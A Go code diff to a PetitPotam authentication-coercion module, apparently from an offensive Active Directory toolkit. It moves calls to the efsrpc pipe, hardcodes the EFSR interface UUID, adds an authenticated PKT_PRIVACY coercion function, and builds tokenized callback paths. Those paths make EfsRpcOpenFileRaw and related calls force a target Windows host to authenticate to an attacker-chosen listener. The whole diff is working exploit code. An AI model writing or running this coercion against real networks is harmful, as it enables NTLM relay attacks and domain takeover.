@@ -23,11 +23,14 @@ func (p *PetitPotam) Description() string {
 }
 
 func (p *PetitPotam) PipeName() string {
-	return "lsarpc" // Also works on efsrpc
+	// Use efsrpc for authenticated RPC (PKT_PRIVACY)
+	// lsarpc works for simple bind but efsrpc is more reliable with full auth
+	return "efsrpc"
 }
 
 func (p *PetitPotam) InterfaceUUID() dcerpc.UUID {
-	return dcerpc.EFSR_UUID
+	// Native EFSR interface UUID (works with efsrpc pipe)
+	return dcerpc.MustParseUUID("df1941c5-fe89-4e79-bf10-463657acf44d")
 }
 
 func (p *PetitPotam) InterfaceVersion() uint32 {
@@ -47,28 +50,56 @@ func (p *PetitPotam) Opnums() []OpnumInfo {
 
 func (p *PetitPotam) Coerce(ctx context.Context, rpc *dcerpc.Client, listener string, opts CoerceOptions) error {
 	opnums := p.getOpnums(opts)
-	paths := buildCallbackPaths(listener, opts.UseHTTP, opts.HTTPPort)
+
+	// Build tokenized path for callback correlation
+	path, _ := BuildCallbackPathWithToken(listener, opts.UseHTTP, opts.HTTPPort, "petit", opts.Token)
 
 	var lastErr error
 	for _, opnum := range opnums {
-		for _, path := range paths {
-			stub := p.createStub(path, opnum.Opnum)
-			_, err := rpc.Call(opnum.Opnum, stub)
+		stub := p.createStub(path, opnum.Opnum)
+		_, err := rpc.Call(opnum.Opnum, stub)
 
-			if err != nil {
-				// Check for success indicators
-				if isCoercionSuccess(err) {
-					return nil // Success!
-				}
-				lastErr = err
-				continue
+		if err != nil {
+			// Check for success indicators
+			if isCoercionSuccess(err) {
+				return nil // Success!
 			}
+			lastErr = err
+			continue
+		}
 
-			// No error - might be success or patched
-			if opnum.Opnum != 0 {
-				// Non-opnum-0 success is likely real
+		// No error - might be success or patched
+		if opnum.Opnum != 0 {
+			// Non-opnum-0 success is likely real
+			return nil
+		}
+	}
+
+	return lastErr
+}
+
+// CoerceAuth uses authenticated RPC (PKT_PRIVACY) for coercion
+func (p *PetitPotam) CoerceAuth(ctx context.Context, rpc *AuthenticatedClient, listener string, opts CoerceOptions) error {
+	opnums := p.getOpnums(opts)
+
+	// Build tokenized path for callback correlation
+	path, _ := BuildCallbackPathWithToken(listener, opts.UseHTTP, opts.HTTPPort, "petit", opts.Token)
+
+	var lastErr error
+	for _, opnum := range opnums {
+		stub := p.createStub(path, opnum.Opnum)
+		_, err := rpc.Call(opnum.Opnum, stub)
+
+		if err != nil {
+			if isCoercionSuccess(err) {
 				return nil
 			}
+			lastErr = err
+			continue
+		}
+
+		if opnum.Opnum != 0 {
+			return nil
 		}
 	}
 
@@ -92,8 +123,7 @@ func (p *PetitPotam) createStub(path string, opnum uint16) []byte {
 
 	switch opnum {
 	case 0: // EfsRpcOpenFileRaw
-		// FileName (unique pointer + conformant varying string)
-		w.WritePointer()
+		// FileName (conformant varying string - NO pointer per goercer)
 		w.WriteUnicodeString(path)
 		// Flags (uint32)
 		w.WriteUint32(0)
